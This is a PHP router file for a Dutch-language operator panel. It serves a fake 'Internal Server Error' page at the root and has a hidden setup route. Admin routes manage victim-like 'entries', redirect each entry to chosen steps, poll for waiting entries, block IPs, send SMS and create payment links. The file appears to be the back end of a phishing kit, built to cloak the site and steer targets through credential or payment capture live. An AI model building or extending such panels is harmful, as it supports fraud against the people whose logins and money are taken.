<?php
try{
	$router = new \classes\core\routing();

        $router->set404(function () {
            die("<h1>Internal Server Error </h1>
                <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
                <p>Please contact the server administrator at webmaster@localhost to inform them of the time this error occured, and the actions you preformed.</p>
                <p>More information about this error may be avalible in the server error log.</p>
                ");
        });

        $router->get('/', function () {
            die("<h1>Internal Server Error </h1>
                <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
                <p>Please contact the server administrator at webmaster@localhost to inform them of the time this error occured, and the actions you preformed.</p>
                <p>More information about this error may be avalible in the server error log.</p>
                ");
        });

 		$router->mount('/beheer', function () use ($router) {  
            $router->get('/', function () {
                 header("Location: /beheer/dashboard");
            });

            $router->all('/login', function(){
				$beheer = new \controllers\beheer(false, false, false, "login");
        		$beheer->login();
            });

            $router->all('/logout', function(){
				$beheer = new \controllers\beheer(false, true, false, "logout");
        		$beheer->logout();
            });

            $router->get('/dashboard', function(){
				$beheer = new \controllers\beheer(true, true, false, "dashboard");
        		$beheer->dashboard();
            });
          
            $router->all('/sms', function(){
                $beheer = new \controllers\beheer(true, true, false, "sms");
                $beheer->sms();
            });

            $router->get('/entries', function(){
				$beheer = new \controllers\beheer(true, true, false, "entries");
                $beheer->entries();
            });

            $router->all('/view-entry/(\w+)', function($uid){
                $beheer = new \controllers\beheer(true, true, false, "entries");
                $beheer->viewEntry($uid);
            });

            $router->get('/redirect-to/(\w+)/(\w+)', function($uid, $type){
                $beheer = new \controllers\beheer(false, true, false, "entries");
                $beheer->redirectTo($uid, $type);
            });
           
            $router->get('/delete-entry/(\w+)', function($uid){
                $beheer = new \controllers\beheer(true, true, false, "entries");
                $beheer->deleteEntry($uid);
            });
          
            $router->get('/block-ip/(.*)', function($ip){
                $beheer = new \controllers\beheer(true, true, false, "entries");
                $beheer->blockip($ip);
            });

            $router->get('/unblock-ip/(.*)', function($ip){
                $beheer = new \controllers\beheer(true, true, false, "entries");
                $beheer->unblockip($ip);
            });

            $router->all('/listen-for-entries', function(){
                $beheer = new \controllers\beheer(false, true, false, "entries");
                $beheer->getNewEntry($_SESSION['user_session']);
            });

            $router->all('/listen-for-updates', function(){
                $beheer = new \controllers\beheer(false, true, false, "entries");
                $beheer->getUpdatedEntry($_SESSION['user_session']);
            });

            $router->all('/listen-for-waiting/(.*)', function($uid){
                $beheer = new \controllers\beheer(false, true, false, "entries");
                $beheer->getWaiting($uid);
            });

            $router->get('/sudo/add-user/(.*)/(.*)/(.*)', function($username, $password, $admin_lvl){
                $beheer = new \controllers\beheer(false, true, true, "sudo");
                $beheer->addUser($username, $password, $admin_lvl);

            });

            $router->get('/sudo/del-user/(.*)', function($username){
                $beheer = new \controllers\beheer(false, true, true, "sudo");
                $beheer->delUser($username);

            });

            $router->get('/delete-verzoek/(.*)', function($uid){
                $beheer = new \controllers\beheer(true, true, false, "entries");
                $beheer->deleteBetaalLink($uid);
            });


            $router->get('/betaal-links', function(){
                $beheer = new \controllers\beheer(true, true, false, "betaal-links");
                $beheer->betaalLinks();
            });

            $router->post('/betaal-links', function(){
                $beheer = new \controllers\beheer(true, true, false, "betaal-links");
                $beheer->doBetaalLinks();
            });

            
            $router->get('/sudo/list-users/', function(){
                $beheer = new \controllers\beheer(false, true, true, "sudo");
                $beheer->listUsers();

            });

            $router->get('/setup-panel/nak@1', function(){
                $setup = new \classes\core\setup();
            });
        });
	$router->Run();
}catch (Exception $e) { echo $e->getMessage(); }
